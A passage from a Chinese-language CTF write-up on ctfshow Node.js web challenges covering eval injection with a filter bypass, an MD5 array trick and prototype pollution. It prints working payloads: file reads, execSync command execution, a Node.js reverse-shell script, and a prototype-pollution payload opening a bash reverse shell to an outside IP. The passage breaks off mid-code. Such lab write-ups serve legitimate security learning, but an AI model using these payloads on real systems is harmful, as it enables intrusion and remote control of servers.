class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>html<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> evalstring <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>eval<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>string<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>amp<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> evalstring<span class="token punctuation">.</span><span class="token function">search</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">exec|load</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>tql<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>index<span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token function">eval</span><span class="token punctuation">(</span>evalstring<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>然后传入</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdireSync</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./routes/index.js'</span><span class="token punctuation">)</span></code></pre><p>可以看到源码，发现过滤了<code>exec</code> 和<code>load</code></p><p>其实已经可以读文件了，所以可以直接读flag</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>另外对于第一次的Payload可以绕过执行</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">%</span>2B<span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac fl001g.txt'</span><span class="token punctuation">)</span></code></pre><p>另外也可以进行反弹shell</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> net <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"net"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    cp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    sh <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">net<span class="token punctuation">.</span>Socket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    client<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">1211</span><span class="token punctuation">,</span> <span class="token string">"xxxxx"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        client<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>stdin<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>        sh<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">a</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web337-数组绕过MD5"><a href="#web337-数组绕过MD5" class="headerlink" title="web337(数组绕过MD5)"></a>web337(数组绕过MD5)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre><p><code>a[x]=1&amp;b[x]=2</code></p><p>数组会被解析成<code>[object Object]</code></p><p><img src="web337.png" loading="lazy"></p><h4 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338(原型链污染)"></a>web338(原型链污染)</h4><p>给了源码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// common.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">深入理解 JavaScript Prototype 污染攻击</a></p><p>看到了copy操作考虑原型链污染，于是尝试污染Object类，添加{“ctfshow”:“36dboy”}属性</p><pre class="language-json" data-language="json"><code class="language-json">POST<span class="token operator">:</span>Content-Type<span class="token operator">:</span> application/json<span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"aa"</span><span class="token punctuation">,</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"ctfshow"</span><span class="token operator">:</span><span class="token string">"36dboy"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web339-模块渲染-反弹shell"><a href="#web339-模块渲染-反弹shell" class="headerlink" title="web339(模块渲染 反弹shell)"></a>web339(模块渲染 反弹shell)</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>原型链污染覆盖 query 实现命令执行</p><p>Function环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p><p>Function(query)(query)可以执行query对应的指令，我们可以使用变量覆盖，将query的值作为反弹shell的点。</p><p>预期解<br>先抓包访问&#x2F;login，实现query值的覆盖，再POST访问&#x2F;api来执行query的值。</p><p>用反弹shell的值覆盖：</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"query"</span><span class="token operator">:</span><span class="token string">"return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="web339.png" loading="lazy"></p><h4 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>这次user对象污染了两层，可以小小测试一下</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token 